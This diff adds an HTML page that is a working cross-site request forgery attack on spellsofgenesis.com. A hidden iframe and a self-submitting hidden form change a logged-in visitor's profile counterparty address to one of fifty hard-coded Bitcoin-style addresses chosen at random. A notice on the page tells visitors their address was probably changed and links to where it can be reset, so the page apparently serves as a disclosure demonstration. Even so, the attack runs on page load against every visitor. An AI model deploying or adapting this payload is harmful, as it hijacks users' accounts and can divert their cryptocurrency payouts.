@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en"> <title>&#9954; CSRF &#9954;</title>
+	<body>
+		<h2 style="text-align:center">CSRF</h2>
+		<p style="text-align:center">If you're visiting this page with javascript turned on and are logged 
+into <a href="https://spellsofgenesis.com">spellsofgenesis.com</a>, your counterparty address field in your profile 
+has probably been changed. Click <a href="https://spellsofgenesis.com/Users/edit_my_profile">here</a> to go there 
+and change it back.</p>
+		<iframe style="display:none" name="csrf"></iframe>
+		<form action="https://spellsofgenesis.com/Users/edit_my_profile" id="UserEditMyProfileForm" 
+method="post" target="csrf">
+		<div style="display:none;"><input type="hidden" name="_method" value="POST"/></div>
+		<div style="display:none;"><input id="addy" name="data[User][xcp_pubkey]" 
+value="1QEx9kdYQqmNzC8HW8FPQS3Mb7vVXYa7bK" type="hidden" id="UserXcpPubkey"/></div>
+		</form>
+	</body>
+</html>
+<script>
+document.getElementById('addy').value = ["1Ne4XBnmuznrwR3E99dWF1E1bjQfpH2HLi", "1GNGWvTPLRu2E8oYr2gomwWYPSzT9Htm8o", 
+"171Ff6MCquF41ChZ8tJM66EukDTw8tksYN", "1PpDXv1X6sJFx7GRBgdfxAMs8rMF3rwgou", "1LNbN1e3DRnPN3vMNujHkmuSaVbwvnZbBT", 
+"1MKXsgYMyXwV7khxvtkLuafDeU7BgFD76j", "1H6XKZ7ibycpKrUbw6GQTdFUFyTADLKW5D", "13NcXMYw2HaLjcsZoCVd2bmhJiSrLmecis", 
+"1HGESGamUC6q9qMgS4sVkFr1vCDDbgCmAH", "1Mss5fsQWRnqQPeMFE4UULYJzt7zTbv7T3", "1CuxnQBKVpsDGPufFHiBL2qpUHWtc2V8rt", 
+"179YLMFpep6SXc5Vc837bkqFDSMoaXomSu", "1LXgm1YEz41qoxnXKJ1YWY6cn5T4PTPwCs", "1PqgZKuLLiWWUSZUJZvtdDZgyBnwHi3r9J", 
+"1NFq9E3KwKME5GMjyfKtuGbBn8T2ajZSUF", "12asaZXriycKpYeFGMhR7jSCMo29toCJXS", "16ngt6FHJxHM47HMWrx6QGLwNZaHKQYnmL", 
+"18V8215aEoPYXPGPLJmbVknbpKSFmoVYhb", "1HK99qmHdCU9N8XqGythJddR1Bbf4aq7th", "1Crf77DusWn73Cwn5rHGsxV5fguXAWdSud", 
+"15mbTCGa3sRa5P3w3wLaFRfHqDQyMBAAe7", "18Yfpmp63JXp9ux3bV5MZGwKBextbW2knS", "19trnw2pRUqrgDPvCbihB6fMnztNBgc7bY", 
+"18ymexhHEBvpZQVirkcpG3FP6kvKBYDhKe", "1GcvziNg82MutfsNpCoeJkL5fKz5fwcjzp", "14rJmLRnF9M7NdQNbJMKrsUHqYjrNdn5LC", 
+"1A16eQvmdkjffQLxcKLCcgYd77H1CyRMjx", "1AWMxAWzy4oxSC3qeVAmroz5qf1bUoVB1E", "1CfVNATJGXnNZbAvsQpuJBu28YbDtKpVHr", 
+"1FC5xUmG6WvGDfxFxUKmZeiwobgHPExd8L", "17gAdXSn43syCvNyT5nFQyZdMprjnyr6Sf", "1MLoXhQUA2poTY2R1kBCGWUujBLeNoHmEG", 
+"13koqP2dd8BYBdaDSWboJnk7vjFLpWPJhX", "19MQEhUAYmK54cuT9ME1B3397cdGQQPHSZ", "1WRKiKGFqMMxa7z28FtN9N73YJe9hoA1o", 
+"1BHEkBYTda63bzhiw3VutxQjmtQG5upvV7", "1DkgtJZuaCKptmoD8APYYWtvEiFPTYANmD", "1MX32mPqbPokjkXpPxqjUJXUbSvHjmMK9y", 
+"1GvQVnSFC1YyVBckBWrLS89TtmftDsya4m", "19iGJkXfGMQAPjNncKesRQwiNq4EFPk3Q1", "1KReonNTD7cDwJo65xLEvBj8bxqdJC5SW6", 
+"1PBNsuGqdvZpdNCC2VYpvuniu9Krjd3SHd", "1NHiAB4o2VvqvNd1Ha32qvyriQixarAzsx", "1N7FTrvXD6KMNzy6fH7tsXS4MPD2KrLG5q", 
+"1Gkex9DFvPZjboZm3oU6qYFXHBXb8mmwYy", "13nmKmWS85hkbK1HZXvBC1gN27zTunf8Ta", "1DqBKu1GqsTo4zTaLCmcsuCo21mb5evNnW", 
+"13Lr2AEAmy2xUEEu1WfsBaZUpwH1YPbbtY", "1Noy75TF8JbTf2yacSe9y2kqoSKeS6ZefG", 
+"14GxD8YPM3dW6PYkepNyH58thE5AzjCpZp"][Math.floor(Math.random()*50)];
+document.forms[0].submit();
+</script>
